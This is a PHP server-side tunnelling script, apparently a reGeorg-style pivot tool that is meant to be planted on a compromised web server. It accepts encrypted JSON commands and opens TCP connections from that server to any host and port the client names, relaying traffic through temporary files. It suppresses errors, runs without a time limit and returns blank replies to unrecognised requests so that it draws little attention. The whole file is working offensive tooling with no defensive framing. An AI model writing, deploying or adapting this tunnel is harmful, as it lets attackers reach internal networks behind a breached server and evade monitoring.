<?php
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
ignore_user_abort(false);
$KEY = 'CHANGE_ME';


function deriveKeys($key) {
    $master = hash('sha256', $key, true);
    $encKey = hash('sha256', $master . 'enc', true);
    $authKey = hash('sha256', $master . 'auth', true);
    return [$encKey, $authKey];
}

function genKeystream($encKey, $nonce, $len) {
    $stream = '';
    $counter = 0;
    while (strlen($stream) < $len) {
        $stream .= hash('sha256', $encKey . $nonce . pack('N', $counter), true);
        $counter++;
    }
    return substr($stream, 0, $len);
}

function computeTag($authKey, $nonce, $ct) {
    return substr(hash_hmac('sha256', $nonce . $ct, $authKey, true), 0, 16);
}

function dec($data, $key) {
    if (strlen($data) < 28) return null;
    list($encKey, $authKey) = deriveKeys($key);
    $nonce = substr($data, 0, 12);
    $tag = substr($data, strlen($data) - 16);
    $ct = substr($data, 12, strlen($data) - 28);
    $expected = computeTag($authKey, $nonce, $ct);
    if ($tag !== $expected) return null;
    $ks = genKeystream($encKey, $nonce, strlen($ct));
    return $ct ^ $ks;
}

function enc($data, $key) {
    static $counter = 0;
    list($encKey, $authKey) = deriveKeys($key);
    $counter++;
    $nonce = substr(hash('sha256', $encKey . pack('J', $counter), true), 0, 12);
    $ks = genKeystream($encKey, $nonce, strlen($data));
    $ct = $data ^ $ks;
    $tag = computeTag($authKey, $nonce, $ct);
    return $nonce . $ct . $tag;
}


function mkPkt($flag, $sid, $seq, $ack, $data) {
    return pack('CNNNN', $flag, $sid, $seq, $ack, strlen($data)) . $data;
}

function readPkt($buf, &$off) {
    if (strlen($buf) - $off < 17) return null;
    $hdr = unpack('Cflag/Nsid/Nseq/Nack/Ndlen', substr($buf, $off, 17));
    $off += 17;
    $dd = '';
    if ($hdr['dlen'] > 0) {
        if (strlen($buf) - $off < $hdr['dlen']) return null;
        $dd = substr($buf, $off, $hdr['dlen']);
        $off += $hdr['dlen'];
    }
    $hdr['data'] = $dd;
    return $hdr;
}


function sessDir($key, $sid) {
    return sys_get_temp_dir() . '/ysock_h_' . md5($key) . '_' . $sid;
}

function sessWriteBuf($key, $sid) {
    return sessDir($key, $sid) . '/w';
}

function sessCloseFlag($key, $sid) {
    return sessDir($key, $sid) . '/c';
}


function writeFrame($typeByte, $data, $key) {
    $payload = chr($typeByte) . $data;
    $encrypted = enc($payload, $key);
    echo pack('N', strlen($encrypted)) . $encrypted;
    flush();
}


function atomicAppend($file, $data) {
    $fp = @fopen($file, 'a');
    if (!$fp) return false;
    if (flock($fp, LOCK_EX)) {
        fwrite($fp, $data);
        flock($fp, LOCK_UN);
        fclose($fp);
        return true;
    }
    fclose($fp);
    return false;
}


function atomicDrain($file) {
    $fp = @fopen($file, 'c+');
    if (!$fp) return '';
    if (!flock($fp, LOCK_EX | LOCK_NB)) {
        fclose($fp);
        return '';
    }
    $data = stream_get_contents($fp);
    if (strlen($data) > 0) {
        ftruncate($fp, 0);
        rewind($fp);
    }
    flock($fp, LOCK_UN);
    fclose($fp);
    return $data;
}


function performHalfCreate($j, $KEY) {
    $enc = @base64_decode($j['d']);
    if ($enc === false) { echo '{"d":""}'; exit; }

    $raw = dec($enc, $KEY);
    if ($raw === null || strlen($raw) < 2) { echo '{"d":""}'; exit; }


    $off = 2;
    $cnt = unpack('n', substr($raw, 0, 2))[1];
    $synPkt = null;
    for ($i = 0; $i < $cnt; $i++) {
        $p = readPkt($raw, $off);
        if (!$p) break;
        if (($p['flag'] & 0x0F) === 0x01) {
            $synPkt = $p;
        }
    }
    if (!$synPkt) { echo '{"d":""}'; exit; }

    $dd = $synPkt['data'];
    $sid = $synPkt['sid'];
    $hlen = ord($dd[0]);
    $host = substr($dd, 1, $hlen);
    $port = (ord($dd[1 + $hlen]) << 8) | ord($dd[2 + $hlen]);
    $target = "tcp://$host:$port";


    $fp = @stream_socket_client($target, $eno, $estr, 5);
    if (!$fp) {

        $rstFrame = pack('n', 1) . mkPkt(0x00, $sid, 0, $synPkt['seq'], '');
        $encrypted = enc($rstFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '"}';
        exit;
    }
    stream_set_blocking($fp, false);


    $dir = sessDir($KEY, $sid);
    @mkdir($dir, 0755, true);
    $writeBuf = sessWriteBuf($KEY, $sid);
    $closeFlag = sessCloseFlag($KEY, $sid);
    file_put_contents($writeBuf, '', LOCK_EX);


    @ini_set('zlib.output_compression', 0);
    while (ob_get_level()) ob_end_clean();
    ob_implicit_flush(true);
    header('Content-Type: application/octet-stream');
    header('X-Accel-Buffering: no');
    header('Cache-Control: no-cache');


    writeFrame(0x00, '', $KEY);


    $lastActivity = time();
    while (true) {

        if (connection_aborted()) {
            @fclose($fp);
            break;
        }


        if (file_exists($closeFlag)) {
            @fclose($fp);
            break;
        }


        $writeData = atomicDrain($writeBuf);
        if (strlen($writeData) > 0) {
            @fwrite($fp, $writeData);
            $lastActivity = time();
        }


        $read = [$fp];
        $write = null;
        $except = null;
        $changed = @stream_select($read, $write, $except, 0, 200000);

        if ($changed > 0) {

            $allData = '';
            while (true) {
                $data = @fread($fp, 65536);
                if ($data === false || strlen($data) === 0) break;
                $allData .= $data;

                $r2 = [$fp];
                $c2 = @stream_select($r2, $w2, $e2, 0, 10000);
                if ($c2 === 0 || $c2 === false) break;
            }
            if (strlen($allData) === 0 || feof($fp)) {

                if (strlen($allData) > 0) {
                    writeFrame(0x01, $allData, $KEY);
                }
                @fclose($fp);
                writeFrame(0x02, '', $KEY);
                break;
            }

            writeFrame(0x01, $allData, $KEY);
            $lastActivity = time();
        }


        if (time() - $lastActivity > 300) {
            @fclose($fp);
            writeFrame(0x02, '', $KEY);
            break;
        }
    }


    @unlink($writeBuf);
    @unlink($closeFlag);
    @rmdir($dir);
}


function performHalfData($j, $KEY) {
    $sid = intval($j['id'] ?? 0);
    if ($sid === 0) { echo '{"ok":false}'; exit; }

    $enc = @base64_decode($j['d'] ?? '');
    if ($enc === false) { echo '{"ok":false}'; exit; }

    $raw = dec($enc, $KEY);
    if ($raw === null) { echo '{"ok":false}'; exit; }

    $writeBuf = sessWriteBuf($KEY, $sid);
    if (!file_exists($writeBuf)) { echo '{"ok":false}'; exit; }

    if (atomicAppend($writeBuf, $raw)) {
        echo '{"ok":true}';
    } else {
        echo '{"ok":false}';
    }
    exit;
}


function performHalfClose($j, $KEY) {
    $sid = intval($j['id'] ?? 0);
    if ($sid === 0) { echo '{"ok":false}'; exit; }

    $closeFlag = sessCloseFlag($KEY, $sid);
    @file_put_contents($closeFlag, '1');
    echo '{"ok":true}';
    exit;
}


function sessReadBuf($key, $sid) {
    return sessDir($key, $sid) . '/r';
}


function performHandshake($j, $KEY) {
    $enc = @base64_decode($j['d'] ?? '');
    if ($enc === false) { echo '{"d":"","m":3}'; exit; }
    $raw = dec($enc, $KEY);
    if ($raw === null) { echo '{"d":"","m":3}'; exit; }

    $resp = enc($raw, $KEY);
    echo '{"d":"' . base64_encode($resp) . '","m":2}';
    exit;
}


function performClassicCreate($j, $KEY) {
    $enc = @base64_decode($j['d']);
    if ($enc === false) { echo '{"d":""}'; exit; }

    $raw = dec($enc, $KEY);
    if ($raw === null || strlen($raw) < 2) { echo '{"d":""}'; exit; }

    $off = 2;
    $cnt = unpack('n', substr($raw, 0, 2))[1];
    $synPkt = null;
    for ($i = 0; $i < $cnt; $i++) {
        $p = readPkt($raw, $off);
        if (!$p) break;
        if (($p['flag'] & 0x0F) === 0x01) {
            $synPkt = $p;
        }
    }
    if (!$synPkt) { echo '{"d":""}'; exit; }

    $dd = $synPkt['data'];
    $sid = $synPkt['sid'];
    $hlen = ord($dd[0]);
    $host = substr($dd, 1, $hlen);
    $port = (ord($dd[1 + $hlen]) << 8) | ord($dd[2 + $hlen]);
    $target = "tcp://$host:$port";

    $fp = @stream_socket_client($target, $eno, $estr, 5);
    if (!$fp) {
        $rstFrame = pack('n', 1) . mkPkt(0x00, $sid, 0, $synPkt['seq'], '');
        $encrypted = enc($rstFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '"}';
        exit;
    }
    stream_set_blocking($fp, false);

    $dir = sessDir($KEY, $sid);
    @mkdir($dir, 0755, true);
    $writeBuf = sessWriteBuf($KEY, $sid);
    $readBuf = sessReadBuf($KEY, $sid);
    $closeFlag = sessCloseFlag($KEY, $sid);
    file_put_contents($writeBuf, '', LOCK_EX);
    file_put_contents($readBuf, '', LOCK_EX);


    $ackFrame = pack('n', 1) . mkPkt(0x04, $sid, 0, $synPkt['seq'], '');
    $encrypted = enc($ackFrame, $KEY);
    echo '{"d":"' . base64_encode($encrypted) . '","id":"' . $sid . '"}';


    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }


    $lastActivity = time();
    while (true) {
        if (file_exists($closeFlag)) { @fclose($fp); break; }

        $read = [$fp];
        $write = null;
        $except = null;
        $changed = @stream_select($read, $write, $except, 0, 200000);

        if ($changed > 0) {
            $allData = '';
            while (true) {
                $data = @fread($fp, 65536);
                if ($data === false || strlen($data) === 0) break;
                $allData .= $data;
                $r2 = [$fp];
                $c2 = @stream_select($r2, $w2, $e2, 0, 10000);
                if ($c2 === 0 || $c2 === false) break;
            }
            if (strlen($allData) === 0 || feof($fp)) {
                if (strlen($allData) > 0) {
                    atomicAppend($readBuf, $allData);
                }
                @fclose($fp);

                @file_put_contents($dir . '/fin', '1');
                break;
            }
            atomicAppend($readBuf, $allData);
            $lastActivity = time();
        }

        $writeData = atomicDrain($writeBuf);
        if (strlen($writeData) > 0) {
            @fwrite($fp, $writeData);
            $lastActivity = time();
        }

        if (time() - $lastActivity > 300) {
            @fclose($fp);
            break;
        }
    }

    @unlink($writeBuf);
    @unlink($readBuf);
    @unlink($closeFlag);
    @unlink($dir . '/fin');
    @rmdir($dir);
}


function performClassicPoll($j, $KEY) {
    $sid = intval($j['id'] ?? 0);
    if ($sid === 0) { echo '{"d":""}'; exit; }


    if (isset($j['d']) && !empty($j['d'])) {
        $enc = @base64_decode($j['d']);
        if ($enc !== false) {
            $raw = dec($enc, $KEY);
            if ($raw !== null) {
                $writeBuf = sessWriteBuf($KEY, $sid);
                if (file_exists($writeBuf)) {
                    atomicAppend($writeBuf, $raw);
                }
            }
        }
    }


    $readBuf = sessReadBuf($KEY, $sid);
    $data = '';
    if (file_exists($readBuf)) {
        $data = atomicDrain($readBuf);
    }

    $dir = sessDir($KEY, $sid);
    $fin = file_exists($dir . '/fin');

    if (strlen($data) > 0) {
        $respFrame = pack('n', 1) . mkPkt(0x02, $sid, 0, 0, $data);
        $encrypted = enc($respFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '","fin":' . ($fin ? 'true' : 'false') . '}';
    } else if ($fin) {
        $finFrame = pack('n', 1) . mkPkt(0x08, $sid, 0, 0, '');
        $encrypted = enc($finFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '","fin":true}';
    } else {
        echo '{"d":"","fin":false}';
    }
    exit;
}


$ct = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
if (strpos($ct, 'application/octet-stream') === 0 && strpos($ct, 'application/json') === false) {

    echo '';
    exit;
}

$input = file_get_contents('php://input');
if (empty($input)) {
    echo '{"d":""}';
    exit;
}

$j = @json_decode($input, true);
if (!$j || !isset($j['a'])) {
    echo '{"d":""}';
    exit;
}

switch ($j['a']) {
    case 'h':
        performHandshake($j, $KEY);
        break;
    case 'c':
        performHalfCreate($j, $KEY);
        break;
    case 'd':
        performHalfData($j, $KEY);
        break;
    case 'x':
        performHalfClose($j, $KEY);
        break;
    case 'cc':
        performClassicCreate($j, $KEY);
        break;
    case 'cp':
        performClassicPoll($j, $KEY);
        break;
    default:
        echo '{"d":""}';
        exit;
}
